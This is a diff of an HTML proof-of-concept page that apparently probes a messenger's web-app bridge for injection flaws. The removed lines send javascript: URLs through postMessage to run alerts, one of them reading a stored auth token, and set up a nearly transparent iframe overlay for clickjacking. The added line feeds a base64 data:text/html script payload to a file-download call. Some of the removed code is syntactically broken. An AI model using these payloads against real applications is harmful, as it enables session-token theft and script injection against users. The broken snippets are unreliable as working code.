@@ -1,24 +1,4 @@
 <script src="https://st.max.ru/js/max-web-app.js"></script>
 <script>
-    WebApp.downloadFile('https://w7.pngwing.com/pngs/291/415/png-transparent-whiskers-tom-and-jerry-cartoon-tom-and-jerry-mammal-cat-like-mammal-heroes-thumbnail.png','test.png');
-    window.parent.postMessage(
-        {
-            type: "WebAppOpenLink",
-            url: "javascript%3Aalert(document.domain)"
-        },
-        "*"
-);
-</script>
-<iframe src="https://mr1609.web-test.oneme.ru/test-mid" style="opacity:0.1; position:absolute; top:0; left:0; width:100%; height:100%; z-index:9999;"></iframe>
-<script>
-window.parent.postMessage(
-    JSON.stringify({
-        type: WebAppOpenLink,
-        url: javascript:alert(localStorage.getItem(__oneme_auth))
-    }),
-    https://web.max.ru
-);
-window.addEventListener(message, (event) = {
-    console.log(Полученные данные:, event.data);
-});
+    WebApp.downloadFile('data:text/html;base64,PHNjcmlwdD5hbGVydCgnZXhlY3V0aW9uIGluIGZpbGUnKTwvc2NyaXB0Pg==','test.png');
 </script>
